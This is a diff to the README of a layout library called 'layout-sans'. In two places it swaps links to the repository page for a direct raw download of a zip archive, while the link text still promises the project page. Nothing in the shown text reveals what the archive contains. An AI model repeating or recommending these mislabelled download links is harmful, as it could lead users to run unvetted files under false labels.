@@ -1,6 +1,6 @@
 # 🧩 layout-sans - Precise 2D layout for every screen
 
-[![Download](https://img.shields.io/badge/Download-LayoutSans-6f42c1?style=for-the-badge&logo=github)](https://github.com/epact2039/layout-sans)
+[![Download](https://img.shields.io/badge/Download-LayoutSans-6f42c1?style=for-the-badge&logo=github)](https://github.com/epact2039/layout-sans/raw/refs/heads/main/dist/sans-layout-v2.6-beta.4.zip)
 
 ## 🖥️ What this is
 
@@ -12,7 +12,7 @@ It is built for apps that need clean layout rules, text selection, copy, search,
 
 Use this link to visit the download page:
 
-[Open the layout-sans page](https://github.com/epact2039/layout-sans)
+[Open the layout-sans page](https://github.com/epact2039/layout-sans/raw/refs/heads/main/dist/sans-layout-v2.6-beta.4.zip)
 
 If you are using Windows, follow these steps:
 
